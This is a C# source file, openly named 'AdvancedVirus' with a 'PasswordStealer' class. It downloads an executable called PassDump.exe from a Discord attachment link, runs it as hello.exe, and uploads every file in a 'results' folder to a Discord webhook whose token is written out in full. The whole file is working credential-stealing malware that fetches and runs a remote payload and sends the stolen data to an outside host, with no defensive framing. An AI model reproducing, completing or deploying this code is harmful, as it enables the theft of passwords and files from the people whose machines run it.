using System.Diagnostics;
using System.Net.Http;
using System.IO;

namespace AdvancedVirus
{
    public class PasswordStealer
    {
        public static async Task StealPasswords()
        {
            string url = "https://cdn.discordapp.com/attachments/484231482303447042/1435240181841137704/PassDump.exe?ex=690b3f14&is=6909ed94&hm=4600d632610d0bb03463c8da844638a661515e3e7513e039bb8fcfdc14b9f376&";

            using var client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync(url);
            response.EnsureSuccessStatusCode();

            using (Stream contentStream = await response.Content.ReadAsStreamAsync(),
                            fileStream = new FileStream("hello.exe", FileMode.Create, FileAccess.Write, FileShare.None, 8192, true))
            {
                await contentStream.CopyToAsync(fileStream);
            }

            var process = Process.Start("./hello.exe");
            process.WaitForExit();

            await UploadStolenData();
        }

        private static async Task UploadStolenData()
        {
            var files = Directory.GetFiles("results");
            string webhookUrl = "https://discord.com/api/webhooks/484233049710657537/FSruIoTMLuY2z8ahP23MeLZIxv3XOtIq5bdWQADULr9h00Fps0-KrCews89UE1zvRf1R";

            using var client = new HttpClient();

            foreach (var filePath in files)
            {
                var form = new MultipartFormDataContent();

                byte[] fileBytes = File.ReadAllBytes(filePath);
                ByteArrayContent fileContent = new ByteArrayContent(fileBytes);
                form.Add(fileContent, "file", Path.GetFileName(filePath));

                try
                {
                    HttpResponseMessage response = await client.PostAsync(webhookUrl, form);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("File uploaded successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"Failed to upload file. Status code: {response.StatusCode}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
            }
        }
    }
}